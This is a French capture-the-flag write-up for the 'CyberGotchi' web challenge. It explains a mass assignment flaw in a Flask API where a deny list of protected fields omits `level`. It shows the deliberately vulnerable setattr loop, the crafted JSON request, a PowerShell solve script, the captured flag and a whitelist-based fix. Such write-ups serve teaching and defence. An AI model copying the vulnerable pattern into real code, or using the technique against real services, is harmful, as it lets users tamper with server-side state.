<div align="center">

# 🐾 CYBERGOTCHI
### CyberNight 2026 - Web Challenge

**Un Tamagotchi virtuel, une évolution impossible... et une propriété oubliée qui change tout.**

![Category](https://img.shields.io/badge/Category-Web-480E33?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-65B87B?style=for-the-badge)
![Vulnerability](https://img.shields.io/badge/Vulnerability-Mass_Assignment-8499A5?style=for-the-badge)
![Points](https://img.shields.io/badge/Points-500-480E33?style=for-the-badge)

</div>

---

## 📑 Sommaire

1. [Présentation du challenge](#-présentation-du-challenge)
2. [Comprendre la vulnérabilité](#-comprendre-la-vulnérabilité)
3. [Analyse de CyberGotchi](#-analyse-de-cybergotchi)
4. [Exploitation du Mass Assignment](#-exploitation-du-mass-assignment)
5. [Récupération du flag](#-récupération-du-flag)
6. [Script de résolution](#-script-de-résolution)
7. [Correction de la vulnérabilité](#-correction-de-la-vulnérabilité)
8. [Conclusion](#-conclusion)

---

## 🎯 Présentation du challenge

CyberGotchi met en scène **BLOOP**, un Tamagotchi virtuel à faire évoluer jusqu'au **niveau 100** pour obtenir le flag.

Chaque joueur commence au **niveau 1**, avec **0 XP**, et peut choisir parmi trois actions :

| Action | Gain | Limitation |
|:---|:---:|:---|
| 🍎 Nourrir | +10 XP | 5 minutes entre deux actions |
| 🎮 Jouer | +10 XP | 5 minutes entre deux actions |
| ⚡ Entraîner | +10 XP | 5 minutes entre deux actions |

Les trois actions utilisent **le même cooldown côté serveur**. Il faut 100 XP pour gagner un niveau.

### ⏳ Une évolution impossible ?

Pour passer du niveau 1 au niveau 100, il faut gagner 99 niveaux :

- **9 900 XP** à obtenir ;
- **990 actions** à effectuer ;
- **989 intervalles d'attente** de 5 minutes, puisque la première action peut être immédiate.

Cela représente **82 h 25 min** au minimum en jouant normalement. Une autre méthode est donc nécessaire pendant le CTF.

> [!IMPORTANT]
> **Objectif :** atteindre le niveau 100 sans attendre la progression normale, puis récupérer le flag via l'API.

---

## 🧠 Comprendre la vulnérabilité

### Qu'est-ce que le Mass Assignment ?

Le **Mass Assignment** (CWE-915) apparaît lorsqu'une application copie automatiquement des champs fournis par un utilisateur dans les attributs d'un objet interne, sans contrôler précisément les champs qu'il est autorisé à modifier.

Par exemple, une application devrait accepter seulement une action :

```json
{"action":"feed"}
```

Mais si elle applique aussi les propriétés supplémentaires du JSON, un joueur peut essayer de changer un champ interne qui n'était pas prévu pour être modifiable.

Le problème n'est pas nécessairement l'absence de vérification du **type** ou de la **valeur**. Il s'agit surtout d'un défaut de **contrôle des propriétés autorisées**.

### Pourquoi est-ce exploitable ici ?

L'API utilise une liste de propriétés interdites, mais laisse toutes les autres propriétés existantes de l'objet être modifiées. La propriété `level` ne figure pas dans cette liste.

---

## 🔎 Analyse de CyberGotchi

### 1. Observer l'API

Lorsqu'un joueur consulte son compagnon, le navigateur envoie :

```http
GET /api/pet HTTP/1.1
Cookie: bloop_id=...
```

La réponse contient notamment :

```json
{
  "cooldown_remaining": 0,
  "name": "BLOOP",
  "progress": 0,
  "progress_max": 100,
  "stage": 1
}
```

Le niveau est présenté sous l'alias public **`stage`**, sans propriété `level` dans cette réponse.

### 2. Lire le code source fourni

Les joueurs disposent de `app.py` et `models.py` dans l'archive de sources.

Dans `models.py`, la classe `Pet` définit les données internes :

```python
@dataclass
class Pet:
    pet_id: str
    name: str = "BLOOP"
    xp: int = 0
    level: int = 1
    last_action: float = 0.0
```

La méthode `public_view()` montre que `stage` correspond bien à `self.level` :

```python
return {
    "name": self.name,
    "stage": self.level,
    "progress": self.xp % XP_PER_LEVEL,
    "progress_max": XP_PER_LEVEL,
    "cooldown_remaining": max(
        0, int(self.last_action + COOLDOWN_SECONDS - now + 0.999)
    ),
}
```

### 3. Identifier le code vulnérable

Dans `app.py`, la route `POST /api/action` attribue automatiquement certaines propriétés du JSON à l'objet :

```python
protected = {"pet_id", "xp", "last_action"}

for field, value in payload.items():
    if field not in protected and hasattr(pet, field):
        setattr(pet, field, value)
```

Cette logique interdit `pet_id`, `xp` et `last_action`, mais **oublie `level`**.

La validation suivante contrôle seulement que le niveau est entier et compris entre 1 et 100 :

```python
if (
    not isinstance(pet.level, int)
    or isinstance(pet.level, bool)
    or not 1 <= pet.level <= MAX_LEVEL
):
    conn.rollback()
    return jsonify({"error": "Invalid pet state"}), 400
```

La valeur `100` est donc valide, même si le joueur n'aurait jamais dû pouvoir fixer lui-même le niveau.

---

## ⚡ Exploitation du Mass Assignment

### 1. Initialiser une session

On effectue une requête `GET /api/pet`. Le serveur associe le joueur à un compagnon grâce au cookie `bloop_id`.

> [!NOTE]
> Toutes les requêtes de l'exploitation doivent **réutiliser le même cookie**. Sinon, le serveur peut créer un nouveau BLOOP de niveau 1.

### 2. Intercepter une action

Une action normale ressemble à ceci :

```http
POST /api/action HTTP/1.1
Content-Type: application/json
Cookie: bloop_id=...

{"action":"feed"}
```

### 3. Ajouter la propriété oubliée

Avec Burp Suite Repeater, curl ou PowerShell, on ajoute `level` au JSON :

```http
POST /api/action HTTP/1.1
Content-Type: application/json
Cookie: bloop_id=...

{
  "action": "feed",
  "level": 100
}
```

Après le gain normal de 10 XP, la boucle vulnérable exécute l'équivalent de `pet.level = 100`, puis sauvegarde le résultat dans SQLite.

**Il faut effectuer cette requête lorsque le cooldown n'est pas actif**, car la vérification du cooldown intervient avant l'affectation.

### 4. Vérifier le résultat

Lors de l'exploitation locale validée, la réponse a indiqué :

```text
cooldown_remaining : 300
name               : BLOOP
progress           : 10
progress_max       : 100
stage              : 100
```

BLOOP est désormais au **niveau 100** après une seule action.

---

## 🏆 Récupération du flag

La route `/api/reward` vérifie le niveau du compagnon enregistré :

```python
if pet.level < MAX_LEVEL:
    return response_with_cookie(
        {"error": "BLOOP must reach level 100"},
        403, pet, new_pet,
    )
return response_with_cookie({"flag": FLAG}, 200, pet, new_pet)
```

Après l'exploitation, il suffit d'envoyer :

```http
GET /api/reward HTTP/1.1
Cookie: bloop_id=...
```

### 🚩 Flag

```text
CYBN{BL00P_L3V3L_100_UNL0CK3D}
```

Ce flag a été récupéré lors du test local PowerShell.

---

## 💻 Script de résolution

Le dossier `writeup/` contient :

```text
writeup/
├── README.md
└── solve.ps1
```

Le script `solve.ps1` reproduit les trois étapes de l'exploitation : création de session, modification du niveau et lecture de la récompense.

```powershell
$base = "http://localhost:5000"

# 1. Créer la session et récupérer l'état initial
$pet = Invoke-RestMethod `
  -Uri "$base/api/pet" `
  -SessionVariable session

Write-Host "[*] Niveau initial : $($pet.stage)"

# 2. Envoyer une action avec un champ supplémentaire
$payload = @{
  action = "feed"
  level  = 100
} | ConvertTo-Json

$result = Invoke-RestMethod `
  -Uri "$base/api/action" `
  -Method POST `
  -WebSession $session `
  -ContentType "application/json" `
  -Body $payload

Write-Host "[+] Niveau obtenu : $($result.pet.stage)"

# 3. Lire la récompense avec la même session
$reward = Invoke-RestMethod `
  -Uri "$base/api/reward" `
  -WebSession $session

Write-Host "[+] FLAG : $($reward.flag)"
```

### Exécution

Depuis la racine du challenge, dans PowerShell :

```powershell
.\writeup\solve.ps1
```

Le script suppose que la cible est accessible à `http://localhost:5000` et que la session n'est pas déjà soumise au cooldown. Il suffit d'adapter `$base` à l'URL du challenge hébergé.

---

## 🛡️ Correction de la vulnérabilité

### Pourquoi la validation actuelle ne suffit pas ?

Le serveur vérifie que `level` est un entier compris entre 1 et 100, mais **n'empêche pas le client de choisir cette valeur**.

Une liste de champs interdits (`protected`) est fragile : toute nouvelle propriété non ajoutée à la liste peut devenir modifiable.

### Solution : liste blanche des champs autorisés

L'API `/api/action` n'a besoin que du champ `action`. Il faut donc refuser les propriétés supplémentaires :

```python
payload = request.get_json(silent=True)

if not isinstance(payload, dict):
    return jsonify({"error": "JSON object required"}), 400

if set(payload) != {"action"}:
    return jsonify({"error": "Unexpected fields"}), 400

action = payload["action"]
if not isinstance(action, str) or action not in ACTIONS:
    return jsonify({"error": "Unknown action"}), 400

# Aucune affectation générique à l'objet Pet.
pet.gain_xp()
pet.last_action = now
```

Dans l'application corrigée, le niveau ne doit évoluer qu'à travers une logique métier contrôlée par le serveur, comme `gain_xp()`.

### Bonnes pratiques associées

- Utiliser une **liste blanche** des champs autorisés par endpoint.
- Séparer les modèles de requêtes HTTP des objets internes persistés.
- Éviter `setattr()` sur des attributs directement dérivés de données utilisateur.
- Vérifier les types, les droits et les règles métier côté serveur.
- Tester les propriétés inattendues et les objets JSON malformés.

---

## 📚 Conclusion

CyberGotchi montre qu'une application peut contrôler correctement une valeur sans contrôler **qui a le droit de la modifier**.

La progression classique est soumise à un cooldown serveur, mais la route d'action applique automatiquement des attributs supplémentaires au modèle `Pet`. L'oubli de `level` dans la liste des champs protégés permet de passer directement au niveau 100 et de récupérer le flag.

**La leçon principale : il faut autoriser explicitement les champs modifiables, plutôt que tenter de bloquer certains attributs sensibles.**

---

<div align="center">

**CyberNight 2026 - Web / Easy**

*Crédit @estellealz*

</div>
